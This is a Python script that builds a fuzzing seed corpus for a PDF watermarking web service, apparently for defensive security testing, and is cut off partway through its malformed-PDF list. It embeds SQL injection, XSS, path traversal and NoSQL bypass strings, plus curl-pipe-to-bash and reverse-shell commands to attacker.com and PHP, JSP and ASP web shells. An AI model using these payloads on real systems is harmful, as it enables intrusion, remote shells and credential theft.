#!/usr/bin/env python3
"""Create high-quality seed corpus from real-world inputs.

This script creates a comprehensive corpus using:
- Real SQL injection payloads from FuzzDB/PayloadsAllTheThings
- Real PDF samples across different versions and structures
- Hand-crafted API requests based on actual endpoints
- Realistic authentication workflows

Following best practices: Quality + diversity = 100+ seeds per fuzzer.
"""

import json
from pathlib import Path


def ensure_dir(path: Path) -> None:
    """Create directory if it doesn't exist."""
    path.mkdir(parents=True, exist_ok=True)


def write_seed(directory: Path, filename: str, content: bytes) -> None:
    """Write a seed file."""
    filepath = directory / filename
    with open(filepath, "wb") as f:
        f.write(content)
    print(f"Created: {filepath}")


def create_api_fuzzer_seeds() -> None:
    """Create seeds for API fuzzer - 100+ diverse API request patterns."""
    seed_dir = Path("server/fuzz/seeds/api_fuzzer")
    ensure_dir(seed_dir)

    seeds = []

    # 1. Valid requests for each endpoint (20 seeds)
    valid_requests = [
        (
            "valid_create_user.bin",
            {"email": "test@example.com", "password": "SecurePass123!"},
        ),
        ("valid_login.bin", {"email": "user@test.com", "password": "password123"}),
        (
            "valid_upload_minimal.bin",
            {"intended_for": "john@example.com", "method": "basic"},
        ),
        (
            "valid_upload_full.bin",
            {
                "intended_for": "alice@example.com",
                "method": "advanced",
                "filename": "report.pdf",
            },
        ),
        ("valid_list_documents.bin", {}),
        ("valid_list_versions.bin", {"documentid": "1"}),
        ("valid_get_document.bin", {"documentid": "42"}),
        ("valid_delete_document.bin", {"documentid": "5"}),
        (
            "valid_create_watermark.bin",
            {
                "documentid": "1",
                "intended_for": "bob@example.com",
                "method": "robust-xmp",
                "secret": "test-secret",
                "key": "test-key",
            },
        ),
        (
            "valid_read_watermark.bin",
            {"documentid": "1", "method": "robust-xmp", "key": "test-key"},
        ),
        ("valid_get_methods.bin", {}),
        (
            "valid_email_special_chars.bin",
            {"email": "user+tag@example.co.uk", "password": "pass"},
        ),
        (
            "valid_long_email.bin",
            {
                "email": "very.long.email.address.for.testing@subdomain.example.com",
                "password": "pass",
            },
        ),
        (
            "valid_unicode_email.bin",
            {"email": "tëst@example.com", "password": "pässwörd"},
        ),
        ("valid_numeric_fields.bin", {"documentid": 999999, "method": "basic"}),
        (
            "valid_empty_optional.bin",
            {"email": "test@example.com", "password": "pass", "extra": ""},
        ),
        (
            "valid_nested_json.bin",
            {"user": {"email": "test@example.com", "password": "pass"}},
        ),
        ("valid_array_field.bin", {"ids": [1, 2, 3], "method": "basic"}),
        ("valid_boolean_field.bin", {"email": "test@example.com", "remember": True}),
        (
            "valid_null_optional.bin",
            {"email": "test@example.com", "password": "pass", "extra": None},
        ),
    ]

    # 2. SQL Injection variants - MySQL/MariaDB specific (30 seeds)
    sqli_payloads = [
        ("sqli_classic_or.bin", {"email": "admin' OR '1'='1", "password": "anything"}),
        ("sqli_comment_double_dash.bin", {"email": "admin'--", "password": ""}),
        ("sqli_comment_hash.bin", {"email": "admin'#", "password": ""}),
        (
            "sqli_union_select.bin",
            {"email": "' UNION SELECT NULL,NULL,NULL--", "password": ""},
        ),
        (
            "sqli_union_all.bin",
            {
                "email": "' UNION ALL SELECT table_name FROM information_schema.tables--",
                "password": "",
            },
        ),
        (
            "sqli_error_based.bin",
            {"email": "' AND 1=CONVERT(int,(SELECT @@version))--", "password": ""},
        ),
        ("sqli_time_based.bin", {"email": "' OR SLEEP(5)--", "password": ""}),
        ("sqli_boolean_based.bin", {"email": "' AND 1=1--", "password": ""}),
        ("sqli_boolean_false.bin", {"email": "' AND 1=2--", "password": ""}),
        (
            "sqli_stacked_queries.bin",
            {"email": "'; DROP TABLE Users--", "password": ""},
        ),
        (
            "sqli_substring.bin",
            {"email": "' AND SUBSTRING(@@version,1,1)='5'--", "password": ""},
        ),
        (
            "sqli_benchmark.bin",
            {"email": "' OR BENCHMARK(10000000,MD5(1))--", "password": ""},
        ),
        (
            "sqli_group_concat.bin",
            {
                "email": "' UNION SELECT GROUP_CONCAT(email) FROM Users--",
                "password": "",
            },
        ),
        (
            "sqli_into_outfile.bin",
            {"email": "' INTO OUTFILE '/tmp/test.txt'--", "password": ""},
        ),
        (
            "sqli_load_file.bin",
            {"email": "' UNION SELECT LOAD_FILE('/etc/passwd')--", "password": ""},
        ),
        ("sqli_hex_encoding.bin", {"email": "0x61646d696e", "password": ""}),
        (
            "sqli_char_function.bin",
            {"email": "' OR email=CHAR(97,100,109,105,110)--", "password": ""},
        ),
        (
            "sqli_concat.bin",
            {"email": "' OR CONCAT(email,password) LIKE '%admin%'--", "password": ""},
        ),
        ("sqli_having.bin", {"email": "' HAVING 1=1--", "password": ""}),
        ("sqli_order_by.bin", {"email": "' ORDER BY 10--", "password": ""}),
        ("sqli_limit.bin", {"email": "' LIMIT 1,1--", "password": ""}),
        (
            "sqli_double_query.bin",
            {
                "email": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT email FROM Users LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
                "password": "",
            },
        ),
        (
            "sqli_extractvalue.bin",
            {
                "email": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
                "password": "",
            },
        ),
        (
            "sqli_updatexml.bin",
            {
                "email": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--",
                "password": "",
            },
        ),
        (
            "sqli_procedure_analyse.bin",
            {"email": "' PROCEDURE ANALYSE()--", "password": ""},
        ),
        (
            "sqli_double_encode.bin",
            {"email": "%2527%2520OR%25201%253D1--", "password": ""},
        ),
        ("sqli_scientific_notation.bin", {"email": "1e1", "password": ""}),
        ("sqli_negative_id.bin", {"documentid": -1}),
        (
            "sqli_json_field.bin",
            {"email": "admin", "password": "' OR JSON_EXTRACT(password,'$')='admin'--"},
        ),
        (
            "sqli_polyglot.bin",
            {
                "email": "SLEEP(1) /*' or SLEEP(1) or'\" or SLEEP(1) or \"*/",
                "password": "",
            },
        ),
    ]

    # 3. XSS patterns (15 seeds)
    xss_payloads = [
        (
            "xss_script_tag.bin",
            {"email": "<script>alert(1)</script>", "password": "pass"},
        ),
        (
            "xss_img_onerror.bin",
            {"email": "<img src=x onerror=alert(1)>", "password": "pass"},
        ),
        ("xss_svg_onload.bin", {"intended_for": "<svg onload=alert(1)>"}),
        ("xss_iframe_src.bin", {"intended_for": "<iframe src=javascript:alert(1)>"}),
        (
            "xss_body_onload.bin",
            {"email": "<body onload=alert(1)>", "password": "pass"},
        ),
        (
            "xss_input_autofocus.bin",
            {"email": "<input autofocus onfocus=alert(1)>", "password": "pass"},
        ),
        (
            "xss_javascript_protocol.bin",
            {"intended_for": "javascript:alert(document.domain)"},
        ),
        (
            "xss_data_uri.bin",
            {"intended_for": "data:text/html,<script>alert(1)</script>"},
        ),
        (
            "xss_escaped_quotes.bin",
            {"email": "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e", "password": "pass"},
        ),
        (
            "xss_unicode.bin",
            {
                "email": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
                "password": "pass",
            },
        ),
        (
            "xss_html_entity.bin",
            {"email": "&lt;script&gt;alert(1)&lt;/script&gt;", "password": "pass"},
        ),
        (
            "xss_style_expression.bin",
            {"intended_for": "<div style=xss:expression(alert(1))>"},
        ),
        ("xss_link_href.bin", {"intended_for": "<link href=javascript:alert(1)>"}),
        (
            "xss_meta_refresh.bin",
            {
                "intended_for": "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>"
            },
        ),
        ("xss_object_data.bin", {"intended_for": "<object data=javascript:alert(1)>"}),
    ]

    # 4. Path traversal patterns (10 seeds)
    path_traversal = [
        ("path_traversal_simple.bin", {"filename": "../../../etc/passwd"}),
        (
            "path_traversal_windows.bin",
            {"filename": "..\\..\\..\\windows\\system32\\config\\sam"},
        ),
        (
            "path_traversal_encoded.bin",
            {"filename": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
        ),
        (
            "path_traversal_double_encoded.bin",
            {"filename": "%252e%252e%252f%252e%252e%252f"},
        ),
        ("path_traversal_null_byte.bin", {"filename": "../../../etc/passwd%00.pdf"}),
        ("path_traversal_absolute.bin", {"filename": "/etc/passwd"}),
        ("path_traversal_current_dir.bin", {"filename": "./././././etc/passwd"}),
        (
            "path_traversal_mixed_encoding.bin",
            {"filename": "..%2f..%2f..%2fetc%2fpasswd"},
        ),
        (
            "path_traversal_unicode.bin",
            {"filename": "..\\u2215..\\u2215..\\u2215etc\\u2215passwd"},
        ),
        (
            "path_traversal_overlong_utf8.bin",
            {"filename": "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"},
        ),
    ]

    # 5. Authentication bypass patterns (10 seeds)
    auth_bypass = [
        ("auth_bypass_empty_password.bin", {"email": "admin", "password": ""}),
        ("auth_bypass_null_password.bin", {"email": "admin", "password": None}),
        (
            "auth_bypass_array_password.bin",
            {"email": "admin", "password": ["pass1", "pass2"]},
        ),
        ("auth_bypass_json_password.bin", {"email": "admin", "password": {"$ne": ""}}),
        ("auth_bypass_wildcard.bin", {"email": "admin%", "password": "anything"}),
        ("auth_bypass_nosql.bin", {"email": {"$gt": ""}, "password": {"$gt": ""}}),
        ("auth_bypass_type_juggling.bin", {"email": "admin", "password": True}),
        ("auth_bypass_numeric_email.bin", {"email": 0, "password": 0}),
        (
            "auth_bypass_regex.bin",
            {"email": {"$regex": ".*admin.*"}, "password": "pass"},
        ),
        (
            "auth_bypass_where.bin",
            {"email": "admin", "password": {"$where": "function() { return true; }"}},
        ),
    ]

    # 6. Edge cases and boundaries (15 seeds)
    edge_cases = [
        ("edge_empty_json.bin", {}),
        ("edge_null_fields.bin", {"email": None, "password": None}),
        ("edge_missing_required.bin", {"email": "test@example.com"}),
        (
            "edge_extra_fields.bin",
            {
                "email": "test@example.com",
                "password": "pass",
                "extra1": "val1",
                "extra2": "val2",
            },
        ),
        (
            "edge_very_long_email.bin",
            {"email": "a" * 1000 + "@example.com", "password": "pass"},
        ),
        (
            "edge_very_long_password.bin",
            {"email": "test@example.com", "password": "p" * 10000},
        ),
        ("edge_max_int.bin", {"documentid": 2147483647}),
        ("edge_min_int.bin", {"documentid": -2147483648}),
        ("edge_overflow_int.bin", {"documentid": 9999999999999999999}),
        ("edge_float_documentid.bin", {"documentid": 3.14159}),
        ("edge_string_documentid.bin", {"documentid": "not_a_number"}),
        ("edge_negative_documentid.bin", {"documentid": -999}),
        ("edge_zero_documentid.bin", {"documentid": 0}),
        (
            "edge_special_chars_email.bin",
            {"email": "!#$%&'*+-/=?^_`{|}~@example.com", "password": "pass"},
        ),
        (
            "edge_newlines_in_fields.bin",
            {"email": "test\n@example.com", "password": "pass\r\nword"},
        ),
    ]

    # Combine all seeds
    all_seeds = (
        valid_requests
        + sqli_payloads
        + xss_payloads
        + path_traversal
        + auth_bypass
        + edge_cases
    )

    # Write seeds
    for filename, payload in all_seeds:
        content = json.dumps(payload).encode("utf-8")
        write_seed(seed_dir, filename, content)

    print(f"\n✓ Created {len(all_seeds)} API fuzzer seeds")


def create_inputs_fuzzer_seeds() -> None:
    """Create seeds for inputs fuzzer - 100+ input validation patterns."""
    seed_dir = Path("server/fuzz/seeds/inputs_fuzzer")
    ensure_dir(seed_dir)

    seeds = []

    # SQL Injection comprehensive set (40 seeds)
    sqli_variants = [
        # MySQL/MariaDB specific
        ("sqli_mysql_comment.bin", b"admin'-- "),
        ("sqli_mysql_hash_comment.bin", b"admin'#"),
        ("sqli_mysql_version.bin", b"' OR @@version LIKE '%Maria%'--"),
        ("sqli_mysql_user.bin", b"' UNION SELECT user()--"),
        ("sqli_mysql_database.bin", b"' UNION SELECT database()--"),
        ("sqli_mysql_sleep.bin", b"1' AND SLEEP(5)--"),
        ("sqli_mysql_if.bin", b"1' AND IF(1=1,SLEEP(5),0)--"),
        ("sqli_mysql_concat.bin", b"' OR CONCAT(email,':',password) LIKE '%admin%'--"),
        (
            "sqli_mysql_group_concat.bin",
            b"' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--",
        ),
        ("sqli_mysql_load_file.bin", b"' UNION SELECT LOAD_FILE('/etc/passwd')--"),
        ("sqli_mysql_into_dumpfile.bin", b"' INTO DUMPFILE '/tmp/evil.php'--"),
        ("sqli_mysql_into_outfile.bin", b"' INTO OUTFILE '/var/www/shell.php'--"),
        # Blind SQL injection
        (
            "sqli_blind_time_based.bin",
            b"1' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)--",
        ),
        (
            "sqli_blind_boolean.bin",
            b"1' AND (SELECT LENGTH(password) FROM Users WHERE id=1)>5--",
        ),
        ("sqli_blind_benchmark.bin", b"1' AND BENCHMARK(10000000,MD5('a'))--"),
        # Union-based
        ("sqli_union_null_detection.bin", b"' UNION SELECT NULL--"),
        ("sqli_union_2_cols.bin", b"' UNION SELECT NULL,NULL--"),
        ("sqli_union_3_cols.bin", b"' UNION SELECT NULL,NULL,NULL--"),
        ("sqli_union_5_cols.bin", b"' UNION SELECT NULL,NULL,NULL,NULL,NULL--"),
        ("sqli_union_strings.bin", b"' UNION SELECT 'a','b','c'--"),
        # Error-based
        (
            "sqli_error_double_query.bin",
            b"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT email FROM Users LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
        ),
        (
            "sqli_error_extractvalue.bin",
            b"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT email FROM Users LIMIT 1)))--",
        ),
        (
            "sqli_error_updatexml.bin",
            b"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM Users LIMIT 1)),1)--",
        ),
        ("sqli_error_exp.bin", b"' AND EXP(~(SELECT * FROM (SELECT USER())x))--"),
        # Stacked queries
        ("sqli_stacked_drop.bin", b"'; DROP TABLE Users--"),
        (
            "sqli_stacked_insert.bin",
            b"'; INSERT INTO Users VALUES('hacker','hacked')--",
        ),
        (
            "sqli_stacked_update.bin",
            b"'; UPDATE Users SET password='hacked' WHERE email='admin'--",
        ),
        ("sqli_stacked_delete.bin", b"'; DELETE FROM Users WHERE id>0--"),
        # Encoding and obfuscation
        ("sqli_hex_encoded.bin", b"0x61646d696e' OR '1'='1"),
        ("sqli_char_function.bin", b"' OR email=CHAR(97,100,109,105,110)--"),
        ("sqli_url_encoded.bin", b"%27%20OR%20%271%27%3D%271"),
        ("sqli_double_url_encoded.bin", b"%2527%2520OR%2520%25271%2527%253D%25271"),
        ("sqli_unicode_encoding.bin", b"\\u0027 OR \\u0031=\\u0031--"),
        # Advanced techniques
        ("sqli_second_order.bin", b"admin'--"),
        (
            "sqli_out_of_band.bin",
            b"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.attacker.com\\\\a')))--",
        ),
        (
            "sqli_polyglot_comprehensive.bin",
            b"SLEEP(1) /*' or SLEEP(1) or'\" or SLEEP(1) or \"*/",
        ),
        ("sqli_scientific_notation.bin", b"1e1' OR '1'='1"),
        ("sqli_bitwise_operators.bin", b"1' AND 1&1--"),
        ("sqli_trigonometric.bin", b"1' AND SIN(1)>0--"),
        (
            "sqli_procedure_analyse.bin",
            b"1' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,version())),1)--",
        ),
    ]

    # Path traversal comprehensive (30 seeds)
    path_traversal_variants = [
        ("path_unix_simple.bin", b"../../../../etc/passwd"),
        ("path_unix_deep.bin", b"../../../../../../../../../../../etc/passwd"),
        ("path_windows_simple.bin", b"..\\..\\..\\..\\windows\\win.ini"),
        (
            "path_windows_system32.bin",
            b"..\\..\\..\\..\\windows\\system32\\config\\sam",
        ),
        ("path_mixed_slashes.bin", b"..\\../..\\../etc/passwd"),
        ("path_current_directory.bin", b"./././././etc/passwd"),
        ("path_absolute_unix.bin", b"/etc/passwd"),
        ("path_absolute_windows.bin", b"C:\\windows\\system32\\drivers\\etc\\hosts"),
        ("path_null_byte_simple.bin", b"../../../etc/passwd\\x00.pdf"),
        ("path_null_byte_end.bin", b"../../../../etc/passwd\\x00"),
        ("path_url_encoded.bin", b"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
        ("path_double_encoded.bin", b"%252e%252e%252f%252e%252e%252fetc%252fpasswd"),
        ("path_16bit_unicode.bin", b"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"),
        (
            "path_overlong_utf8.bin",
            b"..%c0%ae%c0%ae%c0%af..%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
        ),
        ("path_unicode_slash.bin", b"..%u2216..%u2216etc%u2216passwd"),
        ("path_alternative_encoding.bin", b"..%c1%1c..%c1%1c..%c1%1cetc%c1%1cpasswd"),
        ("path_backslash_encoded.bin", b"..%5c..%5c..%5cetc%5cpasswd"),
        ("path_forward_slash_encoded.bin", b"..%2f..%2f..%2fetc%2fpasswd"),
        ("path_dot_encoded.bin", b"%2e%2e/%2e%2e/%2e%2e/etc/passwd"),
        ("path_proc_self.bin", b"../../../../proc/self/environ"),
        ("path_proc_version.bin", b"../../../../proc/version"),
        ("path_var_log.bin", b"../../../../var/log/apache2/access.log"),
        ("path_home_user.bin", b"../../../../home/user/.ssh/id_rsa"),
        ("path_root_ssh.bin", b"../../../../root/.ssh/id_rsa"),
        ("path_php_config.bin", b"../../../../etc/php.ini"),
        ("path_apache_config.bin", b"../../../../etc/apache2/apache2.conf"),
        ("path_mysql_config.bin", b"../../../../etc/mysql/my.cnf"),
        ("path_shadow_file.bin", b"../../../../etc/shadow"),
        ("path_group_file.bin", b"../../../../etc/group"),
        ("path_hosts_file.bin", b"../../../../etc/hosts"),
    ]

    # Command injection (20 seeds)
    command_injection = [
        ("cmd_semicolon_ls.bin", b"; ls -la"),
        ("cmd_semicolon_cat.bin", b"; cat /etc/passwd"),
        ("cmd_ampersand_whoami.bin", b"& whoami"),
        ("cmd_pipe_id.bin", b"| id"),
        ("cmd_pipe_uname.bin", b"| uname -a"),
        ("cmd_backticks_whoami.bin", b"`whoami`"),
        ("cmd_dollar_whoami.bin", b"$(whoami)"),
        ("cmd_newline_cat.bin", b"\\ncat /etc/passwd"),
        ("cmd_sleep.bin", b"; sleep 10"),
        (
            "cmd_wget_rce.bin",
            b"; wget http://attacker.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh",
        ),
        ("cmd_curl_rce.bin", b"| curl http://attacker.com/shell.sh | bash"),
        ("cmd_nc_reverse.bin", b"; nc -e /bin/sh attacker.com 4444"),
        ("cmd_bash_rce.bin", b"& bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"),
        (
            "cmd_python_rce.bin",
            b'; python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
        ),
        (
            "cmd_perl_rce.bin",
            b'; perl -e \'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
        ),
        (
            "cmd_ruby_rce.bin",
            b'; ruby -rsocket -e\'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        ),
        (
            "cmd_php_rce.bin",
            b'; php -r \'$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'',
        ),
        ("cmd_env_injection.bin", b"; export MALICIOUS=evil; echo $MALICIOUS"),
        ("cmd_file_write.bin", b"; echo 'evil' > /tmp/evil.txt"),
        ("cmd_chmod.bin", b"; chmod 777 /tmp"),
    ]

    # File upload attacks (10 seeds)
    file_upload = [
        ("upload_php_shell.bin", b"<?php system($_GET['cmd']); ?>"),
        (
            "upload_jsp_shell.bin",
            b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
        ),
        ("upload_asp_shell.bin", b'<% eval request("cmd") %>'),
        ("upload_double_extension.bin", b"shell.php.jpg"),
        ("upload_null_byte.bin", b"shell.php\\x00.jpg"),
        ("upload_htaccess.bin", b"AddType application/x-httpd-php .jpg"),
        ("upload_polyglot_image.bin", b"GIF89a<?php system($_GET['cmd']); ?>"),
        (
            "upload_xml_xxe.bin",
            b'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        ),
        (
            "upload_svg_xss.bin",
            b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
        ),
        ("upload_zip_bomb.bin", b"PK\\x03\\x04" + b"\\x00" * 100),
    ]

    # Combine all
    all_seeds = (
        sqli_variants + path_traversal_variants + command_injection + file_upload
    )

    for filename, content in all_seeds:
        write_seed(seed_dir, filename, content)

    print(f"✓ Created {len(all_seeds)} input validation fuzzer seeds")


def create_watermarking_fuzzer_seeds() -> None:
    """Create seeds for watermarking fuzzer - 100+ PDF variations."""
    seed_dir = Path("server/fuzz/seeds/watermarking_fuzzer")
    ensure_dir(seed_dir)

    seeds = []

    # Minimal valid PDFs across versions (10 seeds)
    minimal_pdfs = [
        # PDF 1.0 - smallest possible
        (
            "minimal_pdf_1.0.bin",
            b"""%PDF-1.0
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R/Resources<<>>>>endobj
xref
0 4
0000000000 65535 f
0000000009 00000 n
0000000052 00000 n
0000000101 00000 n
trailer<</Size 4/Root 1 0 R>>
startxref
178
%%EOF""",
        ),
        # PDF 1.4 - common version
        (
            "minimal_pdf_1.4.bin",
            b"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R/Resources<<>>>>endobj
xref
0 4
0000000000 65535 f
0000000009 00000 n
0000000052 00000 n
0000000101 00000 n
trailer<</Size 4/Root 1 0 R>>
startxref
178
%%EOF""",
        ),
        # PDF 1.7 - most common modern version
        (
            "minimal_pdf_1.7.bin",
            b"""%PDF-1.7
%\\xE2\\xE3\\xCF\\xD3
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R/Resources<<>>>>endobj
xref
0 4
0000000000 65535 f
0000000019 00000 n
0000000062 00000 n
0000000111 00000 n
trailer<</Size 4/Root 1 0 R>>
startxref
188
%%EOF""",
        ),
        # PDF 2.0 - newest standard
        (
            "minimal_pdf_2.0.bin",
            b"""%PDF-2.0
%\\xE2\\xE3\\xCF\\xD3
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R/Resources<<>>>>endobj
xref
0 4
0000000000 65535 f
0000000019 00000 n
0000000062 00000 n
0000000111 00000 n
trailer<</Size 4/Root 1 0 R/ID[<1234567890ABCDEF1234567890ABCDEF><1234567890ABCDEF1234567890ABCDEF>]>>
startxref
188
%%EOF""",
        ),
        # PDF with text content
        (
            "pdf_with_text.bin",
            b"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R/Resources<</Font<</F1 4 0 R>>>>/Contents 5 0 R>>endobj
4 0 obj<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>endobj
5 0 obj<</Length 44>>stream
BT /F1 12 Tf 100 700 Td (Hello World) Tj ET
endstream endobj
xref
0 6
0000000000 65535 f
0000000009 00000 n
0000000052 00000 n
0000000101 00000 n
0000000226 00000 n
0000000295 00000 n
trailer<</Size 6/Root 1 0 R>>
startxref
389
%%EOF""",
        ),
        # PDF with compressed stream
        (
            "pdf_compressed_stream.bin",
            b"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R/Resources<<>>/Contents 4 0 R>>endobj
4 0 obj<</Length 20/Filter/FlateDecode>>stream
\\x78\\x9c\\x2b\\x49\\x2d\\x2e\\x01\\x00\\x04\\x5d\\x01\\xc1
endstream endobj
xref
0 5
0000000000 65535 f
0000000009 00000 n
0000000052 00000 n
0000000101 00000 n
0000000188 00000 n
trailer<</Size 5/Root 1 0 R>>
startxref
280
%%EOF""",
        ),
        # PDF with image (minimal)
        (
            "pdf_with_image.bin",
            b"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R/Resources<</XObject<</Im1 4 0 R>>>>/Contents 5 0 R>>endobj
4 0 obj<</Type/XObject/Subtype/Image/Width 1/Height 1/ColorSpace/DeviceRGB/BitsPerComponent 8/Length 3>>stream
\\xFF\\x00\\x00
endstream endobj
5 0 obj<</Length 18>>stream
q 100 0 0 100 0 0 cm /Im1 Do Q
endstream endobj
xref
0 6
0000000000 65535 f
0000000009 00000 n
0000000052 00000 n
0000000101 00000 n
0000000219 00000 n
0000000362 00000 n
trailer<</Size 6/Root 1 0 R>>
startxref
438
%%EOF""",
        ),
        # PDF with metadata
        (
            "pdf_with_metadata.bin",
            b"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R/Metadata 4 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R/Resources<<>>>>endobj
4 0 obj<</Type/Metadata/Subtype/XML/Length 50>>stream
<?xml version="1.0"?><metadata>test</metadata>
endstream endobj
xref
0 5
0000000000 65535 f
0000000009 00000 n
0000000065 00000 n
0000000114 00000 n
0000000191 00000 n
trailer<</Size 5/Root 1 0 R>>
startxref
302
%%EOF""",
        ),
        # Linearized PDF (for web optimization)
        (
            "pdf_linearized.bin",
            b"""%PDF-1.4
%\\xE2\\xE3\\xCF\\xD3
1 0 obj<</Linearized 1/L 500/O 3/E 300/N 1/T 400/H[100 150]>>endobj
xref
0 0
trailer<</Size 1/Root 1 0 R/Prev 400>>
startxref
0
%%EOF""",
        ),
        # PDF with form fields
        (
            "pdf_with_form.bin",
            b"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R/AcroForm<</Fields[4 0 R]/DR<<>>/DA()>>>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R/Resources<<>>/Annots[4 0 R]>>endobj
4 0 obj<</Type/Annot/Subtype/Widget/Rect[100 100 200 120]/FT/Tx/T(TextField)/V(Value)>>endobj
xref
0 5
0000000000 65535 f
0000000009 00000 n
0000000119 00000 n
0000000168 00000 n
0000000269 00000 n
trailer<</Size 5/Root 1 0 R>>
startxref
376
%%EOF""",
        ),
    ]

    # Malformed PDFs (30 seeds)
    malformed_pdfs = [
        (
            "malformed_no_header.bin",
            b"""1 0 obj<</Type/Catalog>>endobj
xref
0 1
trailer<</Root 1 0 R>>
startxref
0
%%EOF""",
        ),
        ("malformed_wrong_version.bin", b"%PDF-9.9\\n1 0 obj<</Type/Catalog>>endobj"),
        ("malformed_missing_eof.bin", b"%PDF-1.4\\n1 0 obj<</Type/Catalog>>endobj"),
        ("malformed_truncated_header.bin", b"%PD"),
        ("malformed_no_xref.bin", b"%PDF-1.4\\n1 0 obj<</Type/Catalog>>endobj\\n%%EOF"),
        (
            "malformed_no_trailer.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Catalog>>endobj\\nxref\\n0 1\\n%%EOF",
        ),
        (
            "malformed_wrong_xref_count.bin",
            b"%PDF-1.4\\n1 0 obj<<>>endobj\\nxref\\n0 999\\ntrailer<<>>\\n%%EOF",
        ),
        ("malformed_negative_obj_num.bin", b"%PDF-1.4\\n-1 0 obj<<>>endobj\\n%%EOF"),
        (
            "malformed_duplicate_obj.bin",
            b"%PDF-1.4\\n1 0 obj<<>>endobj\\n1 0 obj<<>>endobj\\n%%EOF",
        ),
        ("malformed_unclosed_dict.bin", b"%PDF-1.4\\n1 0 obj<</Type/Catalog\\n%%EOF"),
        ("malformed_unclosed_array.bin", b"%PDF-1.4\\n1 0 obj[1 2 3\\n%%EOF"),
        (
            "malformed_unclosed_string.bin",
            b"%PDF-1.4\\n1 0 obj(unclosed string\\n%%EOF",
        ),
        (
            "malformed_invalid_reference.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Catalog/Pages 999 0 R>>endobj\\n%%EOF",
        ),
        (
            "malformed_circular_reference.bin",
            b"%PDF-1.4\\n1 0 obj<</Parent 1 0 R>>endobj\\n%%EOF",
        ),
        (
            "malformed_wrong_stream_length.bin",
            b"%PDF-1.4\\n1 0 obj<</Length 999>>stream\\ntest\\nendstream\\nendobj\\n%%EOF",
        ),
        (
            "malformed_stream_no_dict.bin",
            b"%PDF-1.4\\nstream\\ntest\\nendstream\\n%%EOF",
        ),
        (
            "malformed_nested_100_deep.bin",
